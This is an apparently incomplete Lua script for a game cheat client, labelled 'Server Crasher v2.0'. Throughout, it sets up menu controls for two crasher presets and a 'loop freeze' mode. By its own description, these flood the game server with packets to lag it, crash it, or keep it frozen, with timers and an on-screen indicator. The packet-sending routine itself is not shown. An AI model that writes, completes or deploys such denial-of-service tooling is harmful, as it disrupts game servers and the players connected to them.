...
local info_text = [[
The strength value represents the amount of packets sent. Lower values will only cause lag while higher values will crash the server.

If the time since last kick exceeds 30 seconds the server fully crashes
	
Crasher 1 and 2 are just presets for the crasher and can't be activated at the same time. I recommend having one for crashing and one for lagging/annoying.

Crash fix included and always active.
]]

local lua_elements = {
  crasher1 = Menu.Switch("Crasher 1", "Enable crasher 1", false),
  crasher1_strength = Menu.SliderInt("Crasher 1", "Strength", 500, 0, 3000),
  crasher1_time_enable = Menu.Switch("Crasher 1", "Auto stop", true),
  crasher1_time = Menu.SliderFloat("Crasher 1", "Stop after", 25, 0, 60, "in seconds"),
	Menu.Text("Server Crasher v2.0", info_text),
  crasher2 = Menu.Switch("Crasher 2", "Enable crasher 2", false),
  crasher2_strength = Menu.SliderInt("Crasher 2", "Strength", 200, 0, 1000),
	crasher2_time_enable = Menu.Switch("Crasher 2", "Auto stop", false),
  crasher2_time = Menu.SliderFloat("Crasher 2", "Stop after", 25, 0, 60, "in seconds"),
  time_since_last_tick = Menu.Switch("Misc", "Time since last tick indicator", true, "Shows how much time has passed since the last packet received from server"),
	loopFreeze = Menu.Switch("Loop freeze", "Enable loop freeze", false),
	loopFreeze_strength = Menu.SliderInt("Loop freeze", "Strength", 500, 0, 1000),
  loopFreeze_time = Menu.SliderFloat("Loop freeze", "Stop after", 5, 0, 60, "in seconds. \nSet this low if you want for people to stay connected"),
	Menu.Text("Loop freeze", "Loop freeze will reactivate the crasher after server starts responding again, effectively freezing the game"),
...
lua_elements.crasher1:SetBool(false)
lua_elements.crasher2:SetBool(false)
lua_elements.loopFreeze:SetBool(false)
lua_elements.crasher1_time:SetVisible(lua_elements.crasher1_time_enable:GetBool())
lua_elements.crasher2_time:SetVisible(lua_elements.crasher2_time_enable:GetBool())

lua_elements.crasher1_time_enable:RegisterCallback(function()
	lua_elements.crasher1_time:SetVisible(lua_elements.crasher1_time_enable:GetBool())
end)

lua_elements.crasher2_time_enable:RegisterCallback(function()
	lua_elements.crasher2_time:SetVisible(lua_elements.crasher2_time_enable:GetBool())
end)

lua_elements.crasher1:RegisterCallback(function()
	local new_state = lua_elements.crasher1:GetBool()
	if not EngineClient:IsInGame() and new_state then
		lua_elements.crasher1:SetBool(false)
		new_state = false
	end
	updateState(new_state and 1 or 0, lua_elements.crasher1_strength:GetInt());
	if new_state then
		lua_elements.crasher2:SetBool(false)
		lua_elements.loopFreeze:SetBool(false)
	end
...
lua_elements.crasher2:RegisterCallback(function()
	local new_state = lua_elements.crasher2:GetBool()
	if not EngineClient:IsInGame() and new_state then
		lua_elements.crasher2:SetBool(false)
		new_state = false
	end
	updateState(new_state and 1 or 0, lua_elements.crasher2_strength:GetInt());
	if new_state then
		lua_elements.crasher1:SetBool(false)
		lua_elements.loopFreeze:SetBool(false)
	end
...
lua_elements.crasher1_strength:RegisterCallback(function()
	if lua_elements.crasher1:GetBool() then
		crasher_state[CRASHER_STATE_STRENGTH] = lua_elements.crasher1_strength:GetInt()
		pcall(function ()
			nezu_crasher_strength:SetString(tostring(crasher_state[CRASHER_STATE_STRENGTH]))
		end)
	end
end)

lua_elements.crasher2_strength:RegisterCallback(function()
	if lua_elements.crasher2:GetBool() then
		crasher_state[CRASHER_STATE_STRENGTH] = lua_elements.crasher2_strength:GetInt()
		pcall(function ()
			nezu_crasher_strength:SetString(tostring(crasher_state[CRASHER_STATE_STRENGTH]))
		end)
	end
...
lua_elements.loopFreeze_strength:RegisterCallback(function()
	if lua_elements.loopFreeze:GetBool() then
		crasher_state[CRASHER_STATE_STRENGTH] = lua_elements.loopFreeze_strength:GetInt()
		pcall(function ()
			nezu_crasher_strength:SetString(tostring(crasher_state[CRASHER_STATE_STRENGTH]))
		end)
	end
...
Cheat.RegisterCallback("frame_stage", function(curStage)
	if curStage == 5 then -- FRAME_RENDER_START
		...
		if lua_elements.loopFreeze:GetBool() and not active then
			...
			if time_delta < 0.1 or (lua_elements.loopFreeze_time:GetFloat() > 5 and last_tick_delta > 5 and time_delta < last_tick_delta) then
				updateState(1, lua_elements.loopFreeze_strength:GetInt())
				active = true
			end
		...
		elseif active then
			...
			if lua_elements.crasher1:GetBool() and lua_elements.crasher1_time_enable:GetBool() then
				if delta > lua_elements.crasher1_time:GetFloat() then
					lua_elements.crasher1:SetBool(false)
					updateState(0, 500)
					active = false
				end
			elseif lua_elements.crasher2:GetBool() and lua_elements.crasher2_time_enable:GetBool() then
				if delta > lua_elements.crasher2_time:GetFloat() then
					lua_elements.crasher2:SetBool(false)
					updateState(0, 500)
					active = false
				end
			elseif lua_elements.loopFreeze:GetBool() then
				if delta > lua_elements.loopFreeze_time:GetFloat() then
					updateState(0, 500)
					active = false
				end
			end
...
Cheat.RegisterCallback("draw", function()
	...
	if lua_elements.crasher_time_started_at ~= -1 then
		...
		local max = 0
		if lua_elements.crasher1:GetBool() and lua_elements.crasher1_time_enable:GetBool() then
			max = lua_elements.crasher1_time:GetFloat()
		elseif lua_elements.crasher2:GetBool() and lua_elements.crasher2_time_enable:GetBool() then
			max = lua_elements.crasher2_time:GetFloat()
		else
			max = 0
		end

		if max > 0 then
			local angle = (( delta / max ) * 360.0) + 90
			Render.Circle(indicator_pos, 8.0, 58, Color.new(1.0, 1.0, 1.0, 1.0), 15.0, 90, angle)
		end

		local text = "Crasher running for: %s"
		local text_size = Render.CalcTextSize(text, 20)
		Render.Text(string.format(text, getTime(delta)), Vector2.new(indicator_pos.x - (text_size.x / 2), indicator_pos.y - 40), Color.new(1.0, 1.0, 1.0, 1.0), 20)
	end

	if lua_elements.time_since_last_tick:GetBool() and EngineClient:IsInGame() then
